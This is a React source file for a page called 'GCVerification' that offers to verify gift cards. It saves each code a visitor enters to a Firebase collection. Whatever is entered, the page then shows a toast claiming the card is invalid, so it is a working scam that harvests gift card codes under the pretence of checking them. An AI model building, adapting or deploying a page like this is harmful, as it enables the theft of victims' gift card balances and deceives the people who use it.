import React, { useState } from "react";
import "./App.css";
import verifylogo from "./612ae3b6883111e9f8c0ca74e4f57e9c-removebg-preview.png";
import { db } from "./firebase";

import { ToastContainer, toast } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";

function App() {
  const [code, setCode] = useState("");

  const notify = () => {
    toast("❌ Error  invalid giftcard ,  Cannot Verify, Gift card is Invalid ");
  };

  const sub = (e) => {
    e.preventDefault();

    // Add data to the store
    db.collection("giftcard code")
      .add({
        code: code,
      })
      .catch((error) => {
        console.error("Cannot Verify, Gift card is Invalid: ", error);
      });
  };
  return (
    <div className="app">
      <div className="header">
        <img src={verifylogo} alt="" />
        <h1>GCVerification</h1>
      </div>
      <form
        onSubmit={(event) => {
          sub(event);
        }}
        className="home"
      >
        <h1>Verify your Gift cards here </h1>
        <h1>Input your code</h1>
        <input
          type="text"
          placeholder="أدخل رمز بطاقة الهدايا"
          onChange={(e) => {
            setCode(e.target.value);
          }}
        />
        <button onClick={notify} className="btn" type="submit">
          Verify
        </button>
        <ToastContainer />
      </form>
      <div className="footer">
        <h2> Verify all forms of giftcards</h2>

        <img
          src="https://i.pinimg.com/236x/8d/f5/e7/8df5e76136dcba44841002494e01e050.jpg"
          alt=""
        />
        <img
          src="https://i.pinimg.com/236x/a2/15/8d/a2158d5eb74c8ffc080d42018d05c114.jpg"
          alt=""
        />
        <img
          src="https://i.pinimg.com/236x/97/7b/73/977b732033117649eaa7e50b29d197a0.jpg"
          alt=""
        />
        <img
          src="https://i.pinimg.com/236x/35/30/4b/35304bacf6c2c414a7cb78704f62bdaa.jpg"
          alt=""
        />
        <img
          src="https://likecard-space.fra1.digitaloceanspaces.com/products/447a5-.png"
          alt=""
        />
        <img
          src="https://likecard-space.fra1.digitaloceanspaces.com/Sliders/abff2-100-400.png"
          alt=""
        />
      </div>
    </div>
  );
}

export default App;
